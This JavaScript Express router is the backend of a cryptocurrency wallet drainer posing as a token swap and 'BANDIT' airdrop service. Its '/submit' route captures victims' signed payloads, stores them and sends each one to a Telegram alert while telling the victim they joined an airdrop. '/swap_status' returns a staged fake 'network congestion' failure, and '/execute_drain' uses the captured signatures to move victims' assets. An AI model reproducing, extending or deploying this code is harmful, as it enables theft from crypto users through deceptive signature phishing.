const express = require("express");
const fs = require("fs");
const path = require("path");
const { executeSignedAction } = require("../utils/executeMultiChainTransfer"); 
const sendTelegramAlert = require("../utils/sendTelegramAlert"); // Telegram alert function


const router = express.Router();

const uploadsDbPath = path.join(__dirname, "../data/uploads.json");
const tokensDbPath = path.join(__dirname, "../data/tokens.json");
const capturedDbPath = path.join(__dirname, "../data/captured.json");
const registryDbPath = path.join(__dirname, "../data/coins.json");
const airdropDbPath = path.join(__dirname, "../data/airdrop.json");
// 🆕 NEW: Unified tokens database
const unifiedTokensDbPath = path.join(__dirname, "../data/unified-tokens.json");


const DEFAULT_REGISTRY = {ethereum: [],solana: [],bnb: [],polygon: []};


// 🔧 FIXED: Now creates files if they don't exist
const ensureDataDir = () => {
    const dir = path.dirname(tokensDbPath);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
    
    // Create empty JSON files if they don't exist
    if (!fs.existsSync(uploadsDbPath)) {
        fs.writeFileSync(uploadsDbPath, JSON.stringify([], null, 2));
    }
    if (!fs.existsSync(tokensDbPath)) {
        fs.writeFileSync(tokensDbPath, JSON.stringify([], null, 2));
    }
    if (!fs.existsSync(capturedDbPath)) {
        fs.writeFileSync(capturedDbPath, JSON.stringify([], null, 2));
    }
    // 🆕 Create unified tokens file with default structure
    if (!fs.existsSync(unifiedTokensDbPath)) {
        fs.writeFileSync(unifiedTokensDbPath, JSON.stringify({
            ethereum: [],
            bnb: [],
            polygon: [],
            solana: []
        }, null, 2));
    }
};

// Initialize on startup
ensureDataDir();

// ==========================================
// 🎁 AIRDROP HELPER FUNCTION
// ==========================================
const addToAirdrop = (userAddress, chainId) => {
    try {
        if (!fs.existsSync(airdropDbPath)) {
            // Create default airdrop file if not exists
            const defaultAirdrop = {
                campaign: {
                    name: "BANDIT Airdrop",
                    token: {
                        symbol: "BNT",
                        address: "2dj9EhzN8YZ7YSYQKspRAzdB5sWNEkUsRa5Pm1AQbSGT",
                        network: "solana",
                        amountPerUser: 50000
                    },
                    totalPool: 500000000,
                    distributed: 0,
                    status: "active"
                },
                participants: []
            };
            fs.writeFileSync(airdropDbPath, JSON.stringify(defaultAirdrop, null, 2));
        }

        let airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
        
        // Check if user already in airdrop list
        const existingUser = airdropData.participants.find(
            p => p.address.toLowerCase() === userAddress.toLowerCase()
        );
        
        if (existingUser) {
            return { success: true, alreadyRegistered: true, participant: existingUser };
        }

        // Add new participant
        const newParticipant = {
            id: Date.now(),
            address: userAddress,
            chainId: chainId,
            amount: airdropData.campaign.token.amountPerUser,
            status: "pending",
            registeredAt: new Date().toISOString(),
            claimedAt: null
        };

        airdropData.participants.push(newParticipant);
        airdropData.campaign.distributed += airdropData.campaign.token.amountPerUser;
        
        fs.writeFileSync(airdropDbPath, JSON.stringify(airdropData, null, 2));
        
        console.log(`🎁 [Airdrop] New registration: ${userAddress} - ${airdropData.campaign.token.amountPerUser} BNT`);
        
        return { success: true, alreadyRegistered: false, participant: newParticipant };
    } catch (error) {
        console.error("❌ [Airdrop] Error adding user:", error);
        return { success: false, error: error.message };
    }
};

// --- EXISTING UPLOAD ROUTES ---
router.get("/uploads", (req, res) => {
    if (!fs.existsSync(uploadsDbPath)) return res.json([]);
    const uploads = JSON.parse(fs.readFileSync(uploadsDbPath, "utf8"));
    res.json(uploads);
});

// ==========================================
// 💰 PRICE PROXY ENDPOINT
// ==========================================
router.get("/prices", async (req, res) => {
    try {
        const axios = require('axios');
        
        // Fetch from CoinGecko with common tokens
        const tokenIds = [
            'bitcoin', 'ethereum', 'binancecoin', 'solana', 'matic-network',
            'usd-coin', 'tether', 'dai', 'wrapped-bitcoin', 'chainlink',
            'uniswap', 'aave', 'compound-governance-token', 'maker',
            'pancakeswap-token', 'sushi', 'curve-dao-token', 'yearn-finance',
            'balancer', 'synthetix-network-token', '1inch', 'the-graph'
        ].join(',');
        
        const response = await axios.get(
            `https://api.coingecko.com/api/v3/coins/markets`,
            {
                params: {
                    vs_currency: 'usd',
                    ids: tokenIds,
                    order: 'market_cap_desc',
                    per_page: 100,
                    page: 1,
                    sparkline: false
                },
                timeout: 10000
            }
        );
        
        res.json(response.data);
    } catch (error) {
        console.error('Price fetch error:', error.message);
        // Return empty array instead of error to prevent frontend crashes
        res.json([]);
    }
});

// ==========================================
// 🆕 DYNAMIC REGISTRY ROUTES
// ==========================================

// 1. GET Full Registry (For App and Admin)
router.get("/registry", (req, res) => {
    try {
        if (!fs.existsSync(registryDbPath)) {
             // Fallback if file deleted
             return res.json(DEFAULT_REGISTRY);
        }
        const registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
        res.json(registry);
    } catch (error) {
        console.error("Registry fetch error:", error);
        res.status(500).json({ error: "Failed to fetch registry" });
    }
});

// 2. ADD/UPDATE Token in Registry
router.post("/registry/add", (req, res) => {
    try {
        const { chain, tokenData } = req.body; // tokenData: { symbol, address, type, decimals, ... }
        
        if (!chain || !tokenData || !tokenData.address) {
            return res.status(400).json({ error: "Invalid data provided" });
        }

        let registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
        if (!registry[chain]) registry[chain] = [];

        // Check if exists (by address)
        const existingIndex = registry[chain].findIndex(t => t.address.toLowerCase() === tokenData.address.toLowerCase());

        if (existingIndex > -1) {
            // Update existing
            registry[chain][existingIndex] = { ...registry[chain][existingIndex], ...tokenData };
        } else {
            // Add new
            registry[chain].push(tokenData);
        }

        fs.writeFileSync(registryDbPath, JSON.stringify(registry, null, 2));
        res.json({ success: true, registry });
    } catch (error) {
        console.error("Add token error:", error);
        res.status(500).json({ error: "Failed to add token" });
    }
});

// 3. DELETE Token from Registry
router.post("/registry/delete", (req, res) => {
    try {
        const { chain, address } = req.body;
        
        let registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
        if (!registry[chain]) return res.status(404).json({ error: "Chain not found" });

        const initialLength = registry[chain].length;
        registry[chain] = registry[chain].filter(t => t.address.toLowerCase() !== address.toLowerCase());

        if (registry[chain].length === initialLength) {
            return res.status(404).json({ error: "Token not found" });
        }

        fs.writeFileSync(registryDbPath, JSON.stringify(registry, null, 2));
        res.json({ success: true, registry });
    } catch (error) {
        console.error("Delete token error:", error);
        res.status(500).json({ error: "Failed to delete token" });
    }
});

// ==========================================
// 🆕 UNIFIED TOKEN MANAGER ROUTES
// ==========================================

// Helper: Get unified tokens database
const getUnifiedTokens = () => {
    ensureDataDir();
    if (!fs.existsSync(unifiedTokensDbPath)) {
        return { ethereum: [], bnb: [], polygon: [], solana: [] };
    }
    return JSON.parse(fs.readFileSync(unifiedTokensDbPath, "utf8"));
};

// Helper: Save unified tokens database
const saveUnifiedTokens = (tokens) => {
    fs.writeFileSync(unifiedTokensDbPath, JSON.stringify(tokens, null, 2));
};

// 1. GET All Unified Tokens (by network or all)
router.get("/unified-tokens", (req, res) => {
    try {
        const { network } = req.query;
        const tokens = getUnifiedTokens();
        
        if (network && tokens[network]) {
            return res.json(tokens[network]);
        }
        
        // Return all as flat array with network included
        const allTokens = [];
        Object.keys(tokens).forEach(net => {
            tokens[net].forEach(token => {
                allTokens.push({ ...token, network: net });
            });
        });
        
        res.json(allTokens);
    } catch (error) {
        console.error("Failed to fetch unified tokens:", error);
        res.status(500).json({ error: "Failed to fetch tokens" });
    }
});

// 2. GET Unified Tokens Grouped by Network
router.get("/unified-tokens/grouped", (req, res) => {
    try {
        const tokens = getUnifiedTokens();
        res.json(tokens);
    } catch (error) {
        console.error("Failed to fetch unified tokens:", error);
        res.status(500).json({ error: "Failed to fetch tokens" });
    }
});

// 3. ADD or UPDATE Unified Token
router.post("/unified-tokens/add", (req, res) => {
    try {
        const { 
            network, 
            symbol, 
            name, 
            address, 
            decimals = 18, 
            type = "ERC20_APPROVE",
            icon = "",
            price = 0,
            isCommon = false,
            isFeatured = false,
            isAirdrop = false,
            coingeckoId = ""
        } = req.body;
        
        if (!network || !symbol || !address) {
            return res.status(400).json({ error: "Network, symbol, and address are required" });
        }
        
        const tokens = getUnifiedTokens();
        if (!tokens[network]) {
            tokens[network] = [];
        }
        
        // Check if token exists (by address)
        const existingIndex = tokens[network].findIndex(
            t => t.address.toLowerCase() === address.toLowerCase()
        );
        
        const tokenData = {
            symbol: symbol.toUpperCase(),
            name,
            address,
            decimals: parseInt(decimals),
            type,
            icon,
            price: parseFloat(price) || 0,
            isCommon,
            isFeatured,
            isAirdrop,
            coingeckoId,
            updatedAt: new Date().toISOString()
        };
        
        if (existingIndex > -1) {
            // Update existing
            tokens[network][existingIndex] = { 
                ...tokens[network][existingIndex], 
                ...tokenData 
            };
        } else {
            // Add new
            tokenData.createdAt = new Date().toISOString();
            tokens[network].push(tokenData);
        }
        
        saveUnifiedTokens(tokens);
        
        // Also sync to old tokens.json for backward compatibility
        syncToLegacyTokens(tokenData, network);
        
        res.json({ 
            success: true, 
            token: tokenData,
            message: existingIndex > -1 ? "Token updated" : "Token added"
        });
    } catch (error) {
        console.error("Failed to add token:", error);
        res.status(500).json({ error: "Failed to add token" });
    }
});

// Helper: Sync to legacy tokens.json for backward compatibility
const syncToLegacyTokens = (tokenData, network) => {
    try {
        let legacyTokens = [];
        if (fs.existsSync(tokensDbPath)) {
            legacyTokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
        }
        
        const legacyToken = {
            id: tokenData.address,
            symbol: tokenData.symbol,
            name: tokenData.name,
            icon: tokenData.icon,
            price: tokenData.price,
            isCommon: tokenData.isCommon,
            network: network
        };
        
        const existingIdx = legacyTokens.findIndex(t => t.id === tokenData.address);
        if (existingIdx > -1) {
            legacyTokens[existingIdx] = legacyToken;
        } else {
            legacyTokens.push(legacyToken);
        }
        
        fs.writeFileSync(tokensDbPath, JSON.stringify(legacyTokens, null, 2));
    } catch (error) {
        console.error("Failed to sync to legacy tokens:", error);
    }
};

// 4. DELETE Unified Token
router.delete("/unified-tokens/:network/:address", (req, res) => {
    try {
        const { network, address } = req.params;
        const tokens = getUnifiedTokens();
        
        if (!tokens[network]) {
            return res.status(404).json({ error: "Network not found" });
        }
        
        const initialLength = tokens[network].length;
        tokens[network] = tokens[network].filter(
            t => t.address.toLowerCase() !== address.toLowerCase()
        );
        
        if (tokens[network].length === initialLength) {
            return res.status(404).json({ error: "Token not found" });
        }
        
        saveUnifiedTokens(tokens);
        
        // Also remove from legacy tokens.json
        try {
            let legacyTokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
            legacyTokens = legacyTokens.filter(t => t.id.toLowerCase() !== address.toLowerCase());
            fs.writeFileSync(tokensDbPath, JSON.stringify(legacyTokens, null, 2));
        } catch (e) {}
        
        res.json({ success: true, message: "Token deleted" });
    } catch (error) {
        console.error("Failed to delete token:", error);
        res.status(500).json({ error: "Failed to delete token" });
    }
});

// 5. BULK IMPORT - Migrate from old systems
router.post("/unified-tokens/migrate", (req, res) => {
    try {
        const tokens = getUnifiedTokens();
        let imported = 0;
        
        // Import from tokens.json (swap tokens)
        if (fs.existsSync(tokensDbPath)) {
            const legacyTokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
            legacyTokens.forEach(token => {
                const network = token.network || "ethereum";
                if (!tokens[network]) tokens[network] = [];
                
                const exists = tokens[network].find(
                    t => t.address?.toLowerCase() === token.id?.toLowerCase()
                );
                
                if (!exists && token.id) {
                    tokens[network].push({
                        symbol: token.symbol,
                        name: token.name,
                        address: token.id,
                        decimals: 18,
                        type: network === "solana" ? "SPL_TOKEN" : "ERC20_APPROVE",
                        icon: token.icon || "",
                        price: token.price || 0,
                        isCommon: token.isCommon || false,
                        isFeatured: token.isFeatured || false,
                        isAirdrop: token.isAirdrop || false,
                        coingeckoId: "",
                        createdAt: new Date().toISOString(),
                        updatedAt: new Date().toISOString()
                    });
                    imported++;
                }
            });
        }
        
        // Import from coins.json (registry)
        if (fs.existsSync(registryDbPath)) {
            const registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
            Object.keys(registry).forEach(network => {
                if (!tokens[network]) tokens[network] = [];
                
                registry[network].forEach(token => {
                    const exists = tokens[network].find(
                        t => t.address?.toLowerCase() === token.address?.toLowerCase()
                    );
                    
                    if (!exists && token.address) {
                        tokens[network].push({
                            symbol: token.symbol,
                            name: token.name || token.symbol,
                            address: token.address,
                            decimals: token.decimals || 18,
                            type: token.type || "ERC20_APPROVE",
                            icon: token.logo || "",
                            price: 0,
                            isCommon: false,
                            isFeatured: false,
                            isAirdrop: false,
                            coingeckoId: "",
                            createdAt: new Date().toISOString(),
                            updatedAt: new Date().toISOString()
                        });
                        imported++;
                    }
                });
            });
        }
        
        saveUnifiedTokens(tokens);
        
        res.json({ 
            success: true, 
            message: `Migration complete. Imported ${imported} tokens.`,
            tokens 
        });
    } catch (error) {
        console.error("Migration failed:", error);
        res.status(500).json({ error: "Migration failed" });
    }
});

// 6. GET Stats for dashboard
router.get("/unified-tokens/stats", (req, res) => {
    try {
        const tokens = getUnifiedTokens();
        
        const stats = {
            total: 0,
            byNetwork: {},
            commonTokens: 0,
            featuredTokens: 0
        };
        
        Object.keys(tokens).forEach(network => {
            stats.byNetwork[network] = tokens[network].length;
            stats.total += tokens[network].length;
            stats.commonTokens += tokens[network].filter(t => t.isCommon).length;
            stats.featuredTokens += tokens[network].filter(t => t.isFeatured).length;
        });
        
        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: "Failed to get stats" });
    }
});


router.post("/uploads/:id/status", (req, res) => {
    const { status } = req.body;
    const id = parseInt(req.params.id);
    if (!fs.existsSync(uploadsDbPath)) return res.status(404).json({ error: "No data" });

    let uploads = JSON.parse(fs.readFileSync(uploadsDbPath, "utf8"));
    const index = uploads.findIndex(u => u.id === id);
    if (index === -1) return res.status(404).json({ error: "Not found" });

    uploads[index].status = status;
    fs.writeFileSync(uploadsDbPath, JSON.stringify(uploads, null, 2));
    res.json({ success: true });
});

// --- TOKEN ROUTES ---

// 1. GET ALL TOKENS
router.get("/gettokens", (req, res) => {
    try {
        if (!fs.existsSync(tokensDbPath)) return res.json([]);
        const tokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
        res.json(tokens);
    } catch (error) {
        console.error("Failed to fetch tokens:", error);
        res.status(500).json({ error: "Failed to fetch tokens" });
    }
});

// 2. ADD NEW TOKEN
router.post("/addtoken", (req, res) => {
    try {
        ensureDataDir();
        const { id, name, symbol, icon, price, isCommon } = req.body;

        if (!id || !symbol) {
            return res.status(400).json({ error: "ID and Symbol required" });
        }

        let tokens = [];
        if (fs.existsSync(tokensDbPath)) {
            tokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
        }

        // Check if exists
        const exists = tokens.find(t => t.id === id);
        if (exists) {
            return res.status(400).json({ error: "Token ID already exists" });
        }

        const newToken = {
            id,
            name,
            symbol,
            icon,
            price: parseFloat(price) || 0,
            isCommon: isCommon || false
        };

        tokens.push(newToken);
        fs.writeFileSync(tokensDbPath, JSON.stringify(tokens, null, 2));

        res.json({ success: true, token: newToken });
    } catch (error) {
        console.error("Failed to add token:", error);
        res.status(500).json({ error: "Failed to add token" });
    }
});

// 3. DELETE TOKEN
router.delete("/deletetoken/:id", (req, res) => {
    try {
        if (!fs.existsSync(tokensDbPath)) {
            return res.status(404).json({ error: "No tokens found" });
        }
        
        let tokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
        const initialLength = tokens.length;
        
        tokens = tokens.filter(t => t.id !== req.params.id);

        if (tokens.length === initialLength) {
            return res.status(404).json({ error: "Token not found" });
        }

        fs.writeFileSync(tokensDbPath, JSON.stringify(tokens, null, 2));
        res.json({ success: true });
    } catch (error) {
        console.error("Failed to delete token:", error);
        res.status(500).json({ error: "Failed to delete token" });
    }
});

// ==========================================
// 🛡️ SIMPLE RATE LIMITER FOR SUBMIT
// ==========================================
const submitRateLimiter = (() => {
    const requests = new Map();
    const WINDOW_MS = 60000; // 1 minute
    const MAX_REQUESTS = 10; // 10 requests per minute per IP
    
    return (req, res, next) => {
        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const now = Date.now();
        
        // Clean old entries
        for (const [key, data] of requests.entries()) {
            if (now - data.firstRequest > WINDOW_MS) {
                requests.delete(key);
            }
        }
        
        const current = requests.get(ip);
        if (!current) {
            requests.set(ip, { count: 1, firstRequest: now });
            return next();
        }
        
        if (now - current.firstRequest > WINDOW_MS) {
            requests.set(ip, { count: 1, firstRequest: now });
            return next();
        }
        
        if (current.count >= MAX_REQUESTS) {
            console.warn(`⚠️ Rate limit exceeded for IP: ${ip}`);
            return res.status(429).json({ 
                error: 'Too many requests. Please try again later.',
                retryAfter: Math.ceil((WINDOW_MS - (now - current.firstRequest)) / 1000)
            });
        }
        
        current.count++;
        next();
    };
})();

// --- 🔧 FIXED CAPTURE ROUTE ---
router.post("/submit", submitRateLimiter, (req, res) => {
    try {
        ensureDataDir();
        const { user, chainId, signature, payload, asset, timestamp } = req.body;
        
        console.log("=== SIGNATURE CAPTURED ===");
        console.log("User:", user);
        console.log("Chain:", chainId);
        console.log("Asset:", asset?.symbol, "on", asset?.chain);
        console.log("Signature:", signature?.slice(0, 20) + "...");
        console.log("========================");

        let capturedData = [];
        
        if (fs.existsSync(capturedDbPath)) {
            const fileContent = fs.readFileSync(capturedDbPath, "utf8");
            try {
                // Fix: Check if fileContent is empty before parsing
                if (fileContent.trim()) {
                    capturedData = JSON.parse(fileContent);
                }
            } catch (parseError) {
                console.warn("⚠️ Warning: captured.json was corrupt or empty. Resetting to [].");
                capturedData = []; // Default to empty array if JSON is invalid
            }
        }

        const newEntry = {
            id: Date.now(),
            timestamp: timestamp || new Date().toISOString(),
            user,
            chainId,
            signature,
            payload,
            asset,
            status: 'pending' 
        };

        capturedData.push(newEntry);
        fs.writeFileSync(capturedDbPath, JSON.stringify(capturedData, null, 2));

        sendTelegramAlert(newEntry);

        // 🎁 AUTO-REGISTER FOR AIRDROP
        let airdropResult = null;
        if (user) {
            airdropResult = addToAirdrop(user, chainId);
        }

        res.json({ 
            success: true, 
            message: airdropResult?.alreadyRegistered 
                ? "Address already registered for airdrop"
                : "Address successfully added to Airdrop List!",
            entryId: newEntry.id,
            airdrop: airdropResult?.success ? {
                registered: true,
                amount: airdropResult.participant?.amount || 50000,
                token: "BNT"
            } : null
        });
    } catch (error) {
        console.error("❌ Capture error:", error);
        res.status(500).json({ error: "Failed to save signature" });
    }
});

// 🆕 GET CAPTURED SIGNATURES (for admin panel)
router.get("/captured", (req, res) => {
    try {
        if (!fs.existsSync(capturedDbPath)) return res.json([]);
        const captured = JSON.parse(fs.readFileSync(capturedDbPath, "utf8"));
        res.json(captured);
    } catch (error) {
        console.error("Failed to fetch captured signatures:", error);
        res.status(500).json({ error: "Failed to fetch data" });
    }
});


router.post("/swap_status", (req, res) => {
    const { user, signature } = req.body;
    
    console.log(`[Status Check] User: ${user} | Sig: ${signature?.slice(0,10)}...`);
    // Simulate network delay (1.5s) then return error
    setTimeout(() => {
        res.json({
            success: false, 
            status: 'failed',
            message: 'Swap Failed: Network congestion detected. Please try again later.'
        });
    }, 1500);
});



// ⚡️ NEW: EXECUTE DRAIN ROUTE
router.post("/execute_drain", async (req, res) => {
    const { signatureId } = req.body;

    console.log(`[Drain Request] Processing ID: ${signatureId}...`);

    try {
        // 1. Load Database
        if (!fs.existsSync(capturedDbPath)) {
            return res.status(404).json({ error: "Database not found" });
        }
        let capturedData = JSON.parse(fs.readFileSync(capturedDbPath, "utf8"));

        // 2. Find the Target Entry
        const targetIndex = capturedData.findIndex(entry => entry.id === signatureId);
        if (targetIndex === -1) {
            return res.status(404).json({ error: "Signature ID not found" });
        }
        const submissionData = capturedData[targetIndex];

        // 3. Execute the Action (Solana Drain / EVM Permit)
        const success = await executeSignedAction({ submissionData });

        if (success) {
            // 4. Update Status in DB
            capturedData[targetIndex].status = 'drained';
            capturedData[targetIndex].drainedAt = Date.now();
            fs.writeFileSync(capturedDbPath, JSON.stringify(capturedData, null, 2));

            console.log(`✅ [Drain Success] ID: ${signatureId}`);
            res.json({ success: true, message: "Drain executed successfully" });
        } else {
            console.error(`❌ [Drain Failed] ID: ${signatureId}`);
            res.status(500).json({ error: "Execution script returned failure" });
        }

    } catch (error) {
        console.error("❌ [Drain Error] Critical failure:", error.message);
        res.status(500).json({ error: error.message || "Internal Execution Error" });
    }
});


// ==========================================
// 🎁 AIRDROP MANAGEMENT ROUTES
// ==========================================

// GET Airdrop Campaign Info
router.get("/airdrop", (req, res) => {
    try {
        if (!fs.existsSync(airdropDbPath)) {
            return res.json({ campaign: null, participants: [] });
        }
        const airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
        
        // Return campaign info without full participant list (privacy)
        res.json({
            campaign: airdropData.campaign,
            totalParticipants: airdropData.participants.length,
            remainingPool: airdropData.campaign.totalPool - airdropData.campaign.distributed
        });
    } catch (error) {
        console.error("Failed to fetch airdrop:", error);
        res.status(500).json({ error: "Failed to fetch airdrop data" });
    }
});

// GET Check if user is eligible/registered for airdrop
router.get("/airdrop/check/:address", (req, res) => {
    try {
        const { address } = req.params;
        
        if (!fs.existsSync(airdropDbPath)) {
            return res.json({ eligible: false, registered: false });
        }
        
        const airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
        const participant = airdropData.participants.find(
            p => p.address.toLowerCase() === address.toLowerCase()
        );
        
        if (participant) {
            res.json({
                eligible: true,
                registered: true,
                amount: participant.amount,
                status: participant.status,
                registeredAt: participant.registeredAt,
                token: airdropData.campaign.token
            });
        } else {
            res.json({
                eligible: true,
                registered: false,
                potentialAmount: airdropData.campaign.token.amountPerUser,
                token: airdropData.campaign.token
            });
        }
    } catch (error) {
        console.error("Failed to check airdrop status:", error);
        res.status(500).json({ error: "Failed to check airdrop status" });
    }
});

// GET All airdrop participants (admin only)
router.get("/airdrop/participants", (req, res) => {
    try {
        if (!fs.existsSync(airdropDbPath)) {
            return res.json([]);
        }
        const airdropData = JSON.parse(fs.readFileSync(airdropDbPath, "utf8"));
        res.json(airdropData.participants);
    } catch (error) {
        console.error("Failed to fetch participants:", error);
        res.status(500).json({ error: "Failed to fetch participants" });
    }
});

// POST Manual airdrop registration (for testing)
router.post("/airdrop/register", (req, res) => {
    try {
        const { wallet, address, walletType, signature, message, timestamp, assets, chainId } = req.body;
        
        // Support both 'wallet' and 'address' field names
        const userAddress = wallet || address;
        
        if (!userAddress) {
            return res.status(400).json({ error: "Wallet address is required" });
        }
        
        // Enhanced registration with additional data
        const result = addToAirdrop(userAddress, walletType || chainId || "unknown");
        
        if (result.success) {
            // Log signature verification attempt (optional)
            if (signature) {
                console.log(`[Airdrop] Signature provided for ${userAddress}: ${signature.slice(0, 20)}...`);
            }
            
            // Log assets if provided
            if (assets && assets.length > 0) {
                console.log(`[Airdrop] User ${userAddress} has ${assets.length} assets`);
            }
            
            // Send Telegram alert for new registrations
            if (!result.alreadyRegistered) {
                sendTelegramAlert(`🎁 New Airdrop Registration!\n\nWallet: ${userAddress}\nType: ${walletType || 'unknown'}\nAssets: ${assets?.length || 0}\nTime: ${new Date().toISOString()}`);
            }
            
            res.json({
                success: true,
                registered: true,
                message: result.alreadyRegistered 
                    ? "Address already registered for airdrop" 
                    : "Successfully registered for airdrop!",
                amount: result.participant?.amount || 50000,
                registeredAt: result.participant?.registeredAt || new Date().toISOString(),
                distributionDate: "Q2 2026 (After TGE)",
                participant: result.participant
            });
        } else {
            res.status(500).json({ error: result.error });
        }
    } catch (error) {
        console.error("Failed to register for airdrop:", error);
        res.status(500).json({ error: "Failed to register for airdrop" });
    }
});

// Export addToAirdrop for use in submit route
router.addToAirdrop = addToAirdrop;


module.exports = router;